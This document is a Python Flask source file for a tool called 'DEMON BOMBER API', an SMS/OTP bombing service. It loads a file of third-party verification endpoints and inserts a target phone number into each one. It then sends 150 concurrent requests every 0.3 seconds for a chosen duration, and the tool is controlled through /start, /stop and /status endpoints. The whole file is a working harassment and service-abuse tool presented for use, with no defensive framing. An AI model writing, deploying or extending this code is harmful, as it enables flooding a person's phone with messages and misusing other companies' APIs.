from flask import Flask, request, jsonify
import aiohttp
import asyncio
import threading
import time
import os

app = Flask(__name__)

# Global attack state
attack_status = {
    'running': False,
    'target': None,
    'duration': 0,
    'total_hits': 0,
    'apis_loaded': 0
}

# Load APIs from file
def load_apis():
    apis = []
    filename = 'bomber_apis.txt'
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                url = line.strip()
                if url.startswith('http') and 'http' in url:
                    # Remove extra characters
                    url = url.split(' ')[0].split('\n')[0]
                    if url and url.startswith('http'):
                        apis.append(url)
    except Exception as e:
        print(f"Error loading APIs: {e}")
    return apis

# Async attack function
async def hit_api(session, url, target):
    try:
        # Replace placeholders
        formatted_url = (url.replace('{target}', target)
                            .replace('{num}', target)
                            .replace('{phone}', target)
                            .replace('{no}', target))
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        async with session.get(formatted_url, headers=headers, timeout=3) as response:
            return response.status in [200, 201, 202, 204, 302, 301]
    except:
        return False

async def attack_loop(target, duration, apis):
    global attack_status
    attack_status['running'] = True
    attack_status['target'] = target
    attack_status['duration'] = duration
    attack_status['total_hits'] = 0
    
    end_time = time.time() + duration
    success_count = 0
    
    async with aiohttp.ClientSession() as session:
        while time.time() < end_time and attack_status['running']:
            # Take first 150 APIs for speed
            batch = apis[:150]
            tasks = [hit_api(session, url, target) for url in batch]
            results = await asyncio.gather(*tasks)
            success_count += sum(1 for r in results if r)
            attack_status['total_hits'] = success_count
            
            # Small delay to prevent rate limiting
            await asyncio.sleep(0.3)
    
    attack_status['running'] = False
    return success_count

def start_attack_thread(target, duration):
    apis = load_apis()
    if not apis:
        return False, "No APIs loaded!"
    
    attack_status['apis_loaded'] = len(apis)
    
    # Run attack in background
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    thread = threading.Thread(target=lambda: loop.run_until_complete(attack_loop(target, duration, apis)))
    thread.start()
    
    return True, f"Attack started on {target} for {duration}s"

# -------- API ENDPOINTS --------

@app.route('/')
def home():
    return '''
    <h1>🔥 DEMON BOMBER API 🔥</h1>
    <p>Use these endpoints:</p>
    <ul>
        <li><b>GET /start?target=9876543210&duration=60</b> - Start attack</li>
        <li><b>GET /stop</b> - Stop attack</li>
        <li><b>GET /status</b> - Check status</li>
        <li><b>GET /apis/count</b> - Check loaded APIs</li>
    </ul>
    '''

@app.route('/start')
def start_attack():
    target = request.args.get('target')
    duration = int(request.args.get('duration', 60))
    
    if not target:
        return jsonify({'error': 'Missing target parameter!'}), 400
    
    if attack_status['running']:
        return jsonify({'error': 'Attack already running! Use /stop first.'}), 400
    
    success, message = start_attack_thread(target, duration)
    
    return jsonify({
        'success': success,
        'message': message,
        'target': target,
        'duration': duration,
        'status': attack_status
    })

@app.route('/stop')
def stop_attack():
    global attack_status
    if attack_status['running']:
        attack_status['running'] = False
        return jsonify({'success': True, 'message': 'Attack stopped successfully!'})
    return jsonify({'success': False, 'message': 'No attack running.'})

@app.route('/status')
def get_status():
    return jsonify({
        'running': attack_status['running'],
        'target': attack_status['target'],
        'duration': attack_status['duration'],
        'total_hits': attack_status['total_hits'],
        'apis_loaded': attack_status['apis_loaded']
    })

@app.route('/apis/count')
def api_count():
    apis = load_apis()
    return jsonify({
        'total_apis': len(apis),
        'sample': apis[:5]
    })

# Health check for Render
@app.route('/health')
def health():
    return jsonify({'status': 'alive', 'uptime': time.time()})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
